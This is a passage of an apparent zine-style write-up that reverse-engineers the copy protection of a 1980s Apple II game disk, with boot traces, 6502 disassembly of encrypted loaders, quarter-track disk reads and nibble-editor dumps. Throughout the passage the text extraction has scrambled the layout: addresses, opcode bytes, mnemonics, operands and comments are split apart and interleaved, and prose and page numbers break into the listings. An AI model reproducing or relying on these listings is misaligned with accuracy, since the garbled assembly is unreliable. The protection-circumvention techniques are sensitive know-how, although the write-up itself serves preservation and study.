BFC2
BFC3
BFC4
BFC6
BFC9
BFCB BD 8C C0
10 FB
38
2A
85 46
BD 8C C0
10 FB
25 46 LDA
BPL
SEC
ROL
STA
LDA
BPL
AND $C08C,X
$BFBD
BFCD
BFCF
BFD0
BFD2
BFD4
BFD7
BFD9
BFDB 91 44
C8
D0 EB
E6 45
BD 8C C0
10 FB
C5 43
D0 BA STA
INY
BNE
INC
LDA
BPL
CMP
BNE ($44),Y
BFDD
BFDF
BFE1
BFE3
BFE4
A=B5
BFE6
A=3B
BFE8
BFE9 A5 45
49 B5
D0 DA
48
A5 45 LDA
EOR
BNE
PHA
LDA $45
#$B5
$BFBD
; A=00
$45 ;
49 8E EOR #$8E ;
48
60
read 4-4-encoded data
$46
$C08C,X
$BFC6
$46
store in memory starting at
$B200 (set at $BF9B)
$BFBD
$45
$C08C,X
$BFD4
$43
$BF97
read into $B200, $B300, and
$B400, then stop
PHA
RTS
JMP $B200
9794
9797 AD E8 C0
4C 00 C5 LDA $C0E8
JMP $C500
B300
B302
B304
B306
B307
(callback is here) copy the
new code to the graphics page
so it survives a reboot
$9782
$9784
$9787
$9782
reboot to my work disk
A0 00
A9 B5
84 59
48
20 30 B3
LDY
LDA
STY
PHA
JSR
#$00
#$B5
$59
some zero page initialization
$B330
*B330L
B330
B331
B333
B335
B336
B339
B33B
B33D
B33E
B340
B342
B344
B346
B348
B349
B34B
I’ll reboot my work disk again, since I disconnected
DOS to examine the code at $BD00..$BFFF.
*C500G
...
]CALL -151
*BLOAD TRACE6
.
. [same as previous trace, up
to and
. including the inline disk
read
. routine copied from $0126
that
. decrypts a sector into zero
page]
.
9775
A9 80
LDA #$80
change the JMP address at
9777
85 3D
STA $3D
$003C so it points to my
9779
A9 97
LDA #$97
callback instead of continuing
977B
85 3E
STA $3E
to $B200
JMP $0600
#$03
$B200,Y
$2200,Y
*B300L
In Which We Flutter For A Day And
Think It Is Forever
4C 00 06
LDX
LDA
STA
INY
BNE
INC
INC
DEX
BNE
$B400 is a disk seek routine, identical to the one
at $BE00. (It even has the same dual entry points
for seeking by half track and quarter track, at $B400
and $B403.) There’s nothing at $B500 yet, so the
routine at $B300 must be another disk read.
And that’s the code we just read from disk,
which means I get to set up another boot trace to
capture it.
977D
A2 03
B9 00 B2
99 00 22
C8
D0 F7
EE 84 97
EE 87 97
CA
D0 EE
*BSAVE TRACE7,A$9600,L$19A
*9600G
. . .reboots slot 6. . .
. . .reboots slot 5. . .
]BSAVE
OBJ.B200-B4FF,A$2200,L$300
]CALL -151
*B200<2200.24FFM
*B200L
B200
A9 04
LDA #$04
B202 20 00 B4
JSR $B400
B205
A9 00
LDA #$00
B207
85 5A
STA $5A
B209 20 00 B3
JSR $B300
B20C 4C 00 B5
JMP $B500
So we push #$00 and #$3B to the stack, then
exit via RTS. That will “return” to $003C, which is
in memory at $203C.
*203CL
203C 4C 00 B2
9780
9782
9785
9788
9789
978B
978E
9791
9792
48
A5 5A
29 07
A8
B9 50 B3
85 50
A5 5A
4A
09 AA
85 51
A5 5A
09 AA
85 52
68
E6 5A
4C 60 B3
PHA
LDA
AND
TAY
LDA
STA
LDA
LSR
ORA
STA
LDA
ORA
STA
PLA
INC
JMP
more zero page initialization
$5A
#$07
$B350,Y
$50
$5A
#$AA
$51
$5A
#$AA
$52
$5A
$B360
*B350.
B350 D5 B5 B7 BC DF D4 B4 DB
That could be an array of nibbles. Maybe a ro-
tating prologue? Or a decryption key?
continue the boot
Oh joy. Another disk read routine.
38*B360L
B360
B362
B364
B366
B368
B36A
B36C
85
A2
86
A0
A5
84
85
54
02
57
00
54
55
56 STA
LDX
STX
LDY
LDA
STY
STA $54
#$02
$57
#$00
$54
$55
$56 B36E
B371
B374
B376
B378
B37A
B37D
B37F
B381
B383
B386
B388
B38A AE 66 BF
BD 8C C0
10 FB
C5 50
D0 F7
BD 8C C0
10 FB
C5 51
D0 F3
BD 8C C0
10 FB
C5 52
D0 F3 LDX
LDA
BPL
CMP
BNE
LDA
BPL
CMP
BNE
LDA
BPL
CMP
BNE $BF66
$C08C,X
$B371
$50
$B371
$C08C,X
$B37A
$51
$B376
$C08C,X
$B383
$52
$B37F find a 3-nibble prologue
(varies, based on the zero
page locations that were
initialized at $B330 based on
the array at $B350)
B38C
B38F
B391
B392
B394
B397
B399 BD 8C C0
10 FB
2A
85 58
BD 8C C0
10 FB
25 58 LDA
BPL
ROL
STA
LDA
BPL
AND $C08C,X
$B38C read a 4-4-encoded sector
B39B
B39D
B39E 91 55
C8
D0 EC B3A0
B3A3
B3A6
B3A8
B3AA
B3AC
B3AE
B3B0
B3B2 0E FF FF
BD 8C C0
10 FB
C9 D4
D0 B6
E6 56
C6 57
D0 DA
60 store the data into ($55)
ASL
LDA
BPL
CMP
BNE
INC
DEC
BNE
RTS find a 1-nibble epilogue
("D4")
$FFFF
$C08C,X
$B3A3
#$D4
$B362
$56
$57
$B38C
Let’s see:
$57 is the sector count. Initially #$02 (set at
$B364), decremented at $B3AE.
$56 is the target page in memory. Set at $B36C
to the accumulator, which is set at $B368 to the
value of address $54, which is set at $B360 to the ac-
cumulator, which is set at $B348 by the PLA, which
was pushed to the stack at $B330, which was origi-
nally set at $B302 to a constant value of #$B5. Then
$56 is incremented (at $B3AC) after reading and de-
coding $100 bytes worth of data from disk.
$55 is #$00, as set at $B36A.
So this reads two sectors into $B500..$B6FF and
returns to the caller.
Backtracking to $B30A. . .
B30A
B30C A4 59
18
B30D AD 65 BF
LDY $59
CLC $59 is initially #$00 (set at
$B304)
LDA $BF65 current phase (track x 2)
79 28 B3 ADC $B328,Y new phase
B313 20 03 B4 JSR $B403 move the drive head to the
new phase, but using the
second entry point, which
uses a reduced timing loop (!)
B316 68 PLA B317
B318 18
69 02 CLC
ADC #$02 this pulls the value that was
pushed to the stack at $B306,
which was the target memory
page to store the data being
read from disk by the routine
at $B360
page += 2
B31A
B31C A4 59
C8 LDY $59
INY counter += 1
B31D
B31F
B321 C0 04
90 E3
60 CPY #$04
BCC $B304
RTS loop for 4 iterations
So we’re reading two sectors at a time, four
times, into $B500+. 2 x 4 = 8, so we’re loading
into $B500..$BCFF. That completely fills the gap
in memory between the code at $B200..$B4FF (this
chunk) and the code at $BD00..$BFFF (copied much
earlier), which strongly suggests that my analysis is
correct.
But what’s going on with the weird drive seek-
ing?
There is some definite weirdness here, and it’s
centered around the array at $B328. At $B200, we
called the main entry point for the drive seek rou-
tine at $B400 to seek to track 2. Now, after reading
two sectors, we’re calling the secondary entry point
(at $B403) to seek. . . where exactly?
$58
$C08C,X
$B394
$58
STA ($55),Y
INY
BNE $B38C B310
*B328.
B328 01 FF 01 00 00 00 00 00
Aha! This array is the differential to get the
drive to seek forward or back. At $B200, we seeked
to track 2. The first time through this loop at
$B304, we read two sectors into $B500..$B6FF, then
add 1 to the current phase, because $B328 = #$01.
Normally this would seek forward a half track, to
track 2.5, but because we’re using the reduced tim-
ing loop, we only seek forward by a quarter track,
to track 2.25.
The second time through the loop, we read two
sectors into $B700..$B8FF, then subtract 1 from the
phase (because $B329 = #$FF) and seek backwards
by a quarter track. Now we’re back on track 2.0.
The third time, we read two sectors from track
2.25 into $B900..$BAFF, then seek forward by a
quarter track, because $B32A = #$01.
The fourth and final time, we read the final two
sectors from track 2.25 into $BB00..$BCFF.
391.75
2.0
2.25
2.5
2.75
B509
B500
B600
20 50 B5
JSR $B550
and call it (modified based on
the previous lookup)
*B580.
B580 50 58 68 70 00 00 58
B700
B800
The high byte of the JSR address never changes,
so depending on the command ID, we’re calling
B900
BA00
BB00
BC00
• 00 => $B550
This explains the little “fluttering” noise the orig-
inal disk makes during this phase of the boot. It’s
flipping back and forth between adjacent quarter
tracks, reading two sectors from each.
Boy am I glad I’m not trying to copy this disk
with a generic bit copier. That would be nearly im-
possible, even if I knew exactly which tracks were
split like this.
• 01 => $B558
• 02 => $B568
• 03 => $B570
• 06 => $B558 again
In Which The Floodgates Burst Open
*BLOAD TRACE7
.
. [same as previous
.
9780
A9 8D
LDA
9782 8D 0D B2
STA
9785
A9 97
LDA
9787 8D 0E B2
STA
trace]
#$8D
$B20D
#$97
$B20E
interrupt the boot at $B20C
after it calls $B300 but before
it jumps to the new code at
$B500
978A 4C 00 B2 JMP $B200 continue the boot
978D
978F
9791
9794
9797
9798
979A
979D
97A0
97A1 A2
A0
B9 00
99 00 LDX
LDY
LDA
STA
INY
BNE
INC
INC
DEX
BNE (callback is here) capture the
code at $B500..$BCFF so it
survives a reboot
97A3
97A6 AD E8 C0
4C 00 C5
D0
EE 93
EE 96
D0
08
00
B5
25
C8
F7
97
97
CA
EE
A nice, compact jump table.
#$08
#$00
$B500,Y
$2500,Y
$9791
$9793
$9796
LDA #$09
LDY #$00
JMP $BA00
*B558L
B558
B55A
B55C 20
B55F
B561
B563 4C LDA
LDY
JSR
LDA
LDY
JMP
A9
A0
00
A9
A0
00
19
00
BA
29
68
BA
#$19
#$00
$BA00
#$29
#$68
$BA00
*B568L
B568
A9 31
B56A
A0 00
B56C 4C 00 BA LDA #$31
LDY #$00
JMP $BA00
*B570L
B570
A9 41
B572
A0 A0
B574 4C 00 BA LDA #$41
LDY #$A0
JMP $BA00
$9791
LDA $C0E8
JMP $C500
reboot to my work disk
Those all look quite similar. Let’s see what’s at
$BA00.
*BA00L
BA00
BA01
*BSAVE TRACE8,A$9600,L$1A9
*9600G
. . .reboots slot 6. . .
. . .reboots slot 5. . .
]BSAVE
OBJ.B500-BCFF,A$2500,L$800
]CALL -151
*B500<2500.2CFFM
*B500L
B500 AE 5F 00 LDX $005F same command ID (saved at
$BF76) that was "printed"
earlier (passed to the routine
at $BF6F via $FDED)
B503 BD 80 B5 LDA $B580,X use command ID as an index
into this new array
B506 8D 0A B5 STA $B50A ! store the array value in the
middle of the next JSR
instruction
22 not
*B550L
B550
A9 09
B552
A0 00
B554 4C 00 BA
48
84 58
PHA
STY $58 save the two input parameters
(A & Y)
BA03 20 00 BE JSR $BE00 seek the drive to a new phase
(given in A)
BA06
BA08
BA0A
BA0D
BA10
BA11 A2
A4
B9 00
9D 00 LDX
LDY
LDA
STA
INY
INX copy a number of bytes from
$B900,Y (Y was passed in
from the caller) to $BB00
BA12
BA14
00
58
B9
BB
C8
E8
E0 0C
90 F4
#$00
$58
$B900,Y
$BB00,X
CPX #$0C
BCC $BA0A
$0C bytes. Always exactly
$0C bytes.
What’s at $B900? All kinds of fun 22 stuff.
guaranteed, actual fun may vary
40*B900.
B900 08
B908 10
B910 18
B918 20
B920 28
B928 30
B930 38
B938 60
B940 68
B948 70
B950 78
B958 80
B960 00
09
11
19
21
29
31
39
61
69
71
79
81
00
0A
12
1A
22
2A
32
3A
62
6A
72
7A
82
00
0B
13
1B
23
2B
33
3B
63
6B
73
7B
83
00
0C
14
1C
24
2C
34
3C
64
6C
74
7C
84
00
0D
15
1D
25
2D
35
3D
65
6D
75
7D
85
00
0E
16
1E
26
2E
36
3E
66
6E
76
7E
86
00
0F
17
1F
27
2F
37
3F
67
6F
77
7F
87
00
That looks suspiciously like a set of high bytes
for addresses in main memory. Note how it starts at
#$08 (immediately after the text page), then later
jumps from #$3F to #$60, skipping over hi-res page
2.
Continuing from $BA16. . .
BA16
20 30 BA JSR $BA30 *BA30L
BA30 AD 65 BF LDA $BF65 current phase
BA33
BA34 4A
A2 03 LSR
LDX #$03 convert it to a track number
BA36 29 0F AND #$0F (track MOD $10)
BA38
BA39 A8
B9 10 BC TAY
LDA $BC10,Y use that as the index into an
array
BA3C
BA3E
BA3F
BA40
BA41
95 50
C8
98
CA
10 F3
STA $50,X
INY
TYA
DEX
BPL $BA36
and store it in zero page
BB35 A4 55
BB37
LDX
LDA
BPL
CMP
BNE
LDA
BPL
CMP
BNE
LDA
BPL
CMP
BNE
$BF66
$C08C,X
$BB1A
$50
$BB1A
$C08C,X
$BB23
$51
$BB1A
$C08C,X
$BB2C
$52
$BB1A
find a 3-nibble prologue
(varies by track, set up at
$BA39)
LDY $55 logical sector number
(initialized to #$00 at $BB15)
B9 00 BB LDA $BB00,Y use the sector number as an
index into the $0C-length
page array we set up at $BA06)
BB3A
BB3D 8D 55 BB
E6 55 STA $BB55
INC $55 and modify the upcoming
code
BB3F
BB42
BB44
BB47
BB48
BB49
BB4A
BB4B
BB4E
BB50 BC 8C C0
10 FB
B9 00 BC
0A
0A
0A
0A
BC 8C C0
10 FB
19 00 BC LDY
BPL
LDA
ASL
ASL
ASL
ASL
LDY
BPL
ORA $C08C,X
$BB3F
$BC00,Y get the actual byte
BB53
BB56
BB59
BB5B 8D 00 FF
EE 54 BB
D0 E4
EE 55 BB STA
INC
BNE
INC $FF00
$BB54
$BB3F
$BB55 modified earlier (at $BB3A) to
be the desired page in
memory
BB5E
BB61
BB63
BB65 BD 8C
10
C5
D0 LDA
BPL
CMP
BNE $C08C,X
$BB5E
$53
$BB0C find a 1-nibble epilogue (also
varies by track)
C0
FB
53
A5
C6 54
D0 CA
60
$C08C,X
$BB4B
$BC00,Y
DEC $54
BNE $BB35
RTS
loop for all $0C sectors
So we’ve read $0C sectors from the current track,
which is the most you can fit on a track with this
kind of “4-and-4” nibble encoding scheme.
Continuing from $BA19. . .
All of those are valid nibbles. Maybe this is set-
ting up another rotating prologue for the next disk
read routine?
Continuing from $BA43. . .
4C 0C BB
AE 66 BF
BD 8C C0
10 FB
C5 50
D0 F7
BD 8C C0
10 FB
C5 51
D0 EE
BD 8C C0
10 FB
C5 52
D0 E5
BB67
BB69
BB6B
*BC10.
BC10 F7 F5 EF EE DF DD D6 BE
BC18 BD BA B7 B6 AF AD AB AA
BA43
BB17
BB1A
BB1D
BB1F
BB21
BB23
BB26
BB28
BB2A
BB2C
BB2F
BB31
BB33
JMP $BB0C
BA19
BA1B
BA1C
BA1E A5 58
18
69 0C
A8
BA1F
BA22 B9 00 B9
F0 07
LDA $58
CLC
ADC #$0C
TAY increment the pointer to the
next memory page
LDA $B900,Y
BEQ $BA2B if the next page is #$00,
we’re done
PLA
CLC
ADC #$02
BNE $BA00 otherwise loop back, where
we’ll move the drive head one
full track forward and read
another $0C sectors
PLA
RTS execution continues here
(from $BA22)
*BB0CL
Oh joy. Another disk read routine.
BB0C
BB0E A2 0C
86 54
BB10
BB12
BB15 A0 00
8C 54 BB
84 55
LDX #$0C
STX $54 I think $54 is the sector count BA24
BA25
BA26
BA28 68
18
69 02
D0 D6
LDY #$00
STY $BB54
STY $55 and $55 is the logical sector
number BA2B
BA2C 68
60
41In Which We Go Completely Insane
Now we have a whole bunch of new stuff in mem-
ory. In this case, $B550 started on track 4.5 (A =
#$09 on entry to $BA00) and filled $0800..$3FFF
and $6000..$87FF. If we “print” a different char-
acter, the routine at $B500 will route through one
of the other subroutines—$B558, $B568, or $B570.
Each of them starts on a different track (A) and
uses a different starting index (Y) into the page array
at $B900. The underlying routine at $BA00 doesn’t
know anything else; it just seeks and reads $0C sec-
tors per track until the target page = #$00.
The code at $B600 is decrypted with the code at
$BE00 as the key. That was originally copied from
the text page the first time, not the second time.
*BLOAD BOOT1 0400-07FF,A$2400
*BE00<2600.26FFM ; move key
into place
*B710:60 ; stop after loop
*B700G ; decrypt
*300L
0300
A0 00
LDY #$00
wipe almost everything we’ve
0302
98
TYA
already loaded at the top of
0303 99 00 B1
STA $B100,Y main memory (!)
0306
C8
INY
0307
D0 F9
BNE $0302
0309 EE 05 03
INC $0305
030C AE 05 03
LDX $0305
Continuing from $B50C. . .
B50C
20 00 B7
*B700L
B700
B702 BD
B705 5D
B708 9D
B70B
B70C
B70E
B710
B713
B716
A2
00
00
00
00
B6
BE
03
E8
E0 D0
90 F2
CE 13 B7
6D 09 B7
60
JSR $B700
LDX
LDA
EOR
STA
INX
CPX
BCC
#$00
$B600,X
$BE00,X
$0300,X
030F
0311
oh joy, another decryption
loop
E0 BD
90 F0
CPX #$BD
BCC $0303
OK, so all we’re left with in memory is the RWTS
at $BD00..$BFFF (including the $FDED vector at
$BF6F) and the single page at $B000. Oh, and the
game, but who cares about that?
Moving on. . .
#$D0
$B702
DEC $B713 !
ADC $B709
RTS
0313
0315
A9 07
20 80 03 LDA #$07
JSR $0380 *380L
0380 20 00 BE JSR $BE00 drive seek (A = #$07, so
track 3.5)
0383
0385
0386
0387 A2 03
68
CA
10 FC LDX #$03
PLA
DEX
BPL $0385 Pull 4 bytes from the stack,
thus negating the JSR that
got us here (at $0315) and the
JSR before that (at $B50C).
0389 4C 18 03 JMP $0318 continue by jumping directly
to the place we would have
returned to, if we hadn’t just
popped the stack (which we
did)
And more self-modifying code.
*B713:6C
*B713L
B713 6C 09 B7
JMP ($B709)
. . .which will jump to the newly decrypted code
at $0300.
To recap: after 7 boot traces, the bootloader
prints a null character via $FD90, which jumps to
$FDED, which jumps to ($0036), which jumps to
$BF6F, which calls $BEB0, which decrypts the code
at $BF9F and returns just in time to execute it.
$BF9F reads 3 sectors into $B200-$B4FF, pushes
#$00/#$3B to the stack and exits via RTS, which
returns to $003C, which jumps to $B200. $B200
reads 8 sectors into $B500-$BCFF from tracks 2 and
2.5, shifting between the adjacent quarter tracks ev-
ery two sectors, then jumps to $B500, which calls
$B5[50|58|68|70], which reads actual game code
from multiple tracks starting at track 4.5, 9.5, 24.5,
or 32.5. Then it calls $B700, which decrypts $B600
into $0300 (using $BE00+ as the decryption key) and
exits via a jump to $0300.
What. The. Fahrvergnugen.
*318L
Oh joy. Another disk routine.
0318 AE 66 BF
LDX $BF66
031B
031D
0320
0322
0324
0326
0329
032B
032D
032F
0332
0334
0336
0338
0339
I’m sure 23 the code at $0300 will be straightfor-
ward and easy to understand.
23 not
stop at $BD00
actually sure
42
A4 5F
BD 8C
10
C9
D0
BD 8C
10
C9
D0
BD 8C
10
C9
D0
C0
FB
D4
F7
C0
FB
D5
F3
C0
FB
D7
F3
88
30 08
LDY $5F Y = command ID (a.k.a. the
character we "printed" way
back when)
LDA
BPL
CMP
BNE
LDA
BPL
CMP
BNE
LDA
BPL
CMP
BNE find a 3-nibble prologue ("D4
D5 D7")
$C08C,X
$031D
#$D4
$031D
$C08C,X
$0326
#$D5
$0322
$C08C,X
$032F
#$D7
$032B
DEY
BMI $0343
branch when Y goes negative033B 20 51 03 JSR $0351 read one byte from disk, store
it in $5E (not shown)
033E 20 51 03 JSR $0351 read 1 more byte from disk
0341 D0 F5 BNE $0338 loop back, unless the byte is
#$00
tine at $BEB0 re-encrypts the code at $BF9F (because
now we’ve XOR’d it twice so it’s back to its origi-
nal form) and exits via RTS, which “returns” to the
address we pushed to the stack at $0346, which we
read from track 3.5—and varies based on the com-
mand we’re still executing, which is really the char-
acter we “printed” via the output vector.
OK, I see it. It was hard to follow at first because
the exit condition was checked before I knew it was
a loop. But this is a loop. On track 3.5, there is
a 3-nibble prologue ("D4 D5 D7"), then an array of
values. Each value is two bytes. We’re just finding
the Nth value in the array. But to what end?
0343
0346
0347
034A
20 51 03
48
20 51 03
48
JSR $0351
PHA
JSR $0351
PHA
Which is all completely insane.
execution continues here
(from $0339) read 2 more
bytes from disk and push
them to the stack
In Which We Are Restored To Sanity
LOL, Just Kidding
But Soon, Maybe
Ah! A new “return” address!
Oh God. A new “return” address.
That’s what this is: an array of addresses, in-
dexed by the command ID. That’s what we’re loop-
ing through, and eventually pushing to the stack:
the entry point for this block of the game.
But the entry point for each block is read directly
from disk, so I have no idea what any of them are.
Add that to the list of things I get to come back to
later.
Onward. . .
LDA $C088,X
JMP $0362 turn off the drive motor
*362L
0362
A0 00
0364 99 00 03
0367
C8
0368
C0 65
036A
90 F8 LDY
STA
INY
CPY
BCC #$00
$0300,Y wipe this routine from
memory
036C
036E
036F
0371
0372
0374
0375
0378 LDA
PHA
LDA
PHA
LDA
PHA
DEC
AND #$BE
034B
034E
BD 88 C0
4C 62 03
A9 BE
48
A9 AF
48
A9 34
48
CE 78 03
29 CE
60
*BLOAD TRACE8
.
. [same as previous trace]
.
#$65
$0364
978D
978F
9792
9794
9797
9799 A9
8D 0C
A9
8D 0D
A9
8D 0E
4C
B5
59
B5
FF
B5
979C 4C 00 B5
LDA
STA
LDA
STA
LDA
STA
#$4C
$B50C
#$59
$B50D
#$FF
$B50E
JMP $B500
unconditionally break after
loading the game code into
main memory
continue the boot
*BSAVE TRACE9,A$9600,L$19F
*9600G
. . .reboots slot 6. . .
. . .read read read. . .
<beep>
Success!
*C050 C054 C057 C052
[displays a very nice picture
of a
gumball machine which is
featured in
the game’s introduction
sequence]
*C051
push several values to the
stack
#$AF
#$34
$0378 !
#$CE
More self-modifying code.
*378:28
*378L
0378
28
PLP
0379 CE 7C 03
DEC $037C !
037C
61 60
ADC ($60,X)
*37C:60
*37CL
037C
Since the “JSR $B700” at $B50C never returns (be-
cause of the crazy stack manipulation at $0383),
that’s the last chance I’ll get to interrupt the boot
and capture this chunk of game code in memory.
I won’t know what the entry point is (because it’s
read from disk), but one thing at a time.
pop that #$34 off the stack,
but use it as status registers
(weird, but legal—if it turns
out to matter, I can figure out
exactly which status bits get
set and cleared)
OK, let’s save it. According to the table at
$B900, we filled $0800..$3FFF and $6000..$87FF.
$0800+ is overwritten on reboot by the boot sec-
tor and later by the HELLO program on my work
disk. $8000+ is also overwritten by Diversi-DOS
64K, which is annoying but not insurmountable. So
I’ll save this in pieces.
RTS
Now we “return” to $BEB0 because we pushed
#$BE/#$AF/#$34 but then popped #$34. The rou-
43rest of the last track into $B200 over and over.
*C500G
...
]BSAVE BLOCK
00.2000-3FFF,A$2000,L$2000
]BRUN TRACE9
. . .reboots slot 6. . .
<beep>
*2800<800.1FFFM
*C500G
...
]BSAVE BLOCK
00.0800-1FFF,A$2800,L$1800
]BRUN TRACE9
. . .reboots slot 6. . .
<beep>
*2000<6000.87FFM
*C500G
...
]BSAVE BLOCK
00.6000-87FF,A$2000,L$2800
Let’s capture it.
*BLOAD TRACE9
.
. [same as previous trace]
.
978D
978F
9792
9794
9797
9799
Now what? Well this is only the first chunk of
game code, loaded by printing a null character. By
setting up another trace and changing the value of
zero page $5F, I can route $B500 through a different
subroutine at $B558 or $B568 or $B570 and load a
different chunk of game code.
The first call to $BA00 will fill up the same parts
of memory as we filled when the character (in $5F)
was #$00—$0800..$3FFF and $6000..$87FF. But
it starts reading from disk at phase $19 (track $0C
1/2), so it’s a completely different chunk of code.
The second call to $BA00 starts reading at phase
$29 (track $14 1/2), and it looks at $B900 + Y =
$B968 to get the list of pages to fill in memory.
89
91
99
A1
A9
B2
00
8A
92
9A
A2
AA
B2
00
8B
93
9B
A3
AB
B2
00
8C
94
9C
A4
AC
B2
00
8D
95
9D
A5
AD
B2
00
8E
96
9E
A6
AE
B2
00
4C
B5
59
B5
FF
B5
979C
979E A9 01
85 5F
97A0 4C 00 B5
LDA
STA
LDA
STA
LDA
STA
#$4C
$B50C
#$59
$B50D
#$FF
$B50E
again, break to the monitor at
$B50C instead of continuing to
$B700
LDA #$01
STA $5F change the character being
"printed" to #$01 just before
the bootloader uses it to load
the appropriate chunk of
game code
JMP $B500 continue the boot
*BSAVE TRACE10,A$9600,L$1A3
*9600G
. . .reboots slot 6. . .
. . .read read read. . .
<beep>
*C050 C054 C057 C052
[displays a very nice picture
of the
main game screen]
*C051
*C500G
...
]BSAVE BLOCK
01.2000-3FFF,A$2000,L$2000
]BRUN TRACE10
. . .reboots slot 6. . .
<beep>
*2800<800.1FFFM
*C500G
...
]BSAVE BLOCK
01.0800-1FFF,A$2800,L$1800
]BRUN TRACE9
. . .reboots slot 6. . .
<beep>
*2000<6000.AFFFM
*C500G
...
]BSAVE BLOCK
01.6000-AFFF,A$2000,L$5000
]CALL -151
*BLOAD OBJ.B500-BCFF,A$B500
According to the lookup table
at $B580,
$B500 routed through $B558 to
load the
game code. Here is that
routine:
*B558L
B558
A9 19
LDA #$19
B55A
A0 00
LDY #$00
B55C 20 00 BA
JSR $BA00
B55F
A9 29
LDA #$29
B561
A0 68
LDY #$68
B563 4C 00 BA
JMP $BA00
*B968.
B968 88
B970 90
B978 98
B980 A0
B988 A8
B990 B2
B998 00
A9
8D 0C
A9
8D 0D
A9
8D 0E
8F
97
9F
A7
AF
B2
00
And similarly with blocks 2 and 3. (These are
not shown here, but you can look at TRACE11 and
TRACE12 on my work disk.) Blocks 4 and 5 get
special-cased earlier (at $BF86 and $BF8D, respec-
tively), so they never reach $B500 to load anything
from disk. Block 6 is the same as block 1.
The first call to $BA00 stopped just shy of $8800,
and that’s exactly where we pick up in the second
call. I’m guessing that $B200 isn’t really used, but
the track read routine at $BA00 is “dumb” in that
it always reads exactly $0C sectors from each track.
So we’re filling up $8800..$AFFF, then reading the
That’s it. I’ve captured all the game code.
Here’s what the “game” looks like at this point:
44Rather than try to boot-trace every possible
block, I’m going to load up the original disk in a
nibble editor and do the calculations myself. The
array of entry points is on track 3.5. Firing up
Copy II Plus nibble editor, I searched for the same
3-nibble prologue (“D4 D5 D7”) that the code at
$031D searches for, and lo and behold!
]CATALOG
C1983 DSR^C#254
019 FREE
A 002 HELLO
B 003 BOOT0
*B 003 TRACE
B 003 BOOT1 0300-03FF
*B 003 TRACE2
B 003 BOOT1 0100-01FF
*B 003 TRACE3
B 006 BOOT1 0400-07FF
*B 003 TRACE4
B 005 BOOT2 0500-07FF
*B 003 TRACE5
B 003 BOOT2 B000-B0FF
B 003 BOOT2 0100-01FF
*B 003 TRACE6
B 003 BOOT3 0000-00FF
*B 003 TRACE7
B 005 OBJ.B200-B4FF
*B 003 TRACE8
B 010 OBJ.B500-BCFF
*B 003 TRACE9
B 026 BLOCK 00.0800-1FFF
B 034 BLOCK 00.2000-3FFF
B 042 BLOCK 00.6000-87FF
*B 003 TRACE10
B 026 BLOCK 01.0800-1FFF
B 034 BLOCK 01.2000-3FFF
B 082 BLOCK 01.6000-AFFF
*B 003 TRACE11
B 026 BLOCK 02.0800-1FFF
B 034 BLOCK 02.2000-3FFF
B 042 BLOCK 02.6000-87FF
*B 003 TRACE12
B 034 BLOCK 03.2000-3FFF
After the “D4 D5 D7” prologue, I find an array
of 4-and-4-encoded nibbles starting at offset $1DC6.
Breaking them down into pairs and decoding them
with the 4-4 encoding scheme, I get this list of bytes:
nibbles
AF AF
EE BE
BA BB
FE FA
AA BA
BA BE
FF FF
AB FF
FF FF
AB FF
FF FF
AB FF
BB AB
BB FF
It’s. . . it’s beautiful. wipes tear
In Which Every Exit Is An Entrance
Somewhere Else
I’ve captured all the blocks of the game code (I
think), but I still have no idea how to run it. The
entry points for each block are read directly from
disk, in the loop at $031D.
And now—maybe!—I have my list of entry points
for each block of the game code.
Only one way to know for
sure. . .
]PR#5
...
]CALL -151
COPY ][ PLUS BIT COPY PROGRAM 8.4
(C) 1982-9 CENTRAL POINT SOFTWARE, INC.
---------------------------------------
TRACK:
03.50
^^^^^
START:
1800
LENGTH:
1DA0:
1DA8:
1DB0:
1DB8:
1DC0: FA
EB
EB
FF
FF AA
FA
EA
FF
FF FA
FF
FC
FF
FF AA FA AA
AE EA EB
FF FF FF
FF FF FF
D4 D5 D7
^^^^^^^^ FA
FF
FF
FF
AF AA
AE
FF
FF
AF
1DC8:
1DD0:
1DD8:
1DE0: EE
BA
AB
BB BE
BE
FF
FF BA
FF
FF
AA BB
FF
FF
AA AA
FF
BB
AA BA
FF
AB
AA
FE
AB
AB
AA
FA
FF
FF
AA
*800:0 N 801<800.BEFEM clear main memory so I’m not
accidentally relying on
random stuff left over from all
my other testing
*BLOAD BLOCK
00.0800-1FFF,A$800
*BLOAD BLOCK
00.2000-3FFF,A$2000
*BLOAD BLOCK
00.6000-87FF,A$6000 load all of block 0 into place
*F9DG
[displays the game intro
sequence]
*does a little happy dance in
my chair* jump to the entry point I
found on track 3.5 (+1, since
the original code pushes it to
the stack and "returns" to it)
3DFF
VIEW
<-1DC3
FIND:
D4 D5
byte
#$0F
#$9C
#$31
#$F8
#$10
#$34
#$FF
#$57
#$FF
#$57
#$FF
#$57
#$23
#$77
D7
---------------------------------------
A TO ? FOR
ANALYZE
HELP SCREEN
DATA
ESC
/
TO
Q FOR NEXT TRACK SPACE
QUIT
CHANGE
TO
We have no further use for the original disk. Now
would be an excellent time to take it out of the drive
and store it in a cool, dry place.
PARMS
RE-READ
45In Which Two Wrongs Don’t Make A—
Oh God I Can’t Even—With This Pun
Remember when I said I’d look at $BD00 later? The
time has come. Later is now.
The output vector at $BF6F has special case han-
dling if A = #$04. Instead of continuing to $0300
and $B500, it jumps directly to $BD00. What’s so
special about $BD00?
The code at $BD00 was moved there very early
in the boot process, from page $0500 on the text
screen. (The first time we loaded code into the text
screen, not the second time.) So it’s in “BOOT1
0400-07FF” on my work disk.
]PR#5
...
]BLOAD BOOT1 0400-07FF,A$2400
]CALL -151
*BD00<2500.25FFM
*BD00L
BD00 AE 66 BF
LDX $BF66
turn on drive motor
BD03 BD 89 C0
LDA $C089,X
BD06
BD08 A9 64
20 A8 FC LDA #$64
JSR $FCA8 wait for drive to settle
BD0B
BD0D A9 10
20 00 BE LDA #$10
JSR $BE00 seek to phase $10 (track 8)
BD10
BD12 A9 02
20 00 BE LDA #$02
JSR $BE00 seek to phase $02 (track 1)
BD15
BD17
BD1A
BD1D
BD20 LDY
LDA
LDA
STA
ORA initialize data latches
BD
BD
9D
1D BD23
BD25
BD28 A9 80
20 A8 FC
20 A8 FC LDA #$80
JSR $FCA8
JSR $FCA8 wait
BD2B
BD2E
BD31
BD32
BD35
BD38
BD39
BD3A
BD3C
BD3E
BD3F BD 8D C0
BD 8E C0
98
9D 8F C0
1D 8C C0
48
68
C1 00
C1 00
EA
C8 LDA
LDA
TYA
STA
ORA
PHA
PLA
CMP
CMP
NOP
INY Oh God
BD40
BD43
BD46
BD49
BD4B
BD4C
BD4D 9D 8D C0
1D 8C C0
B9 8F BD
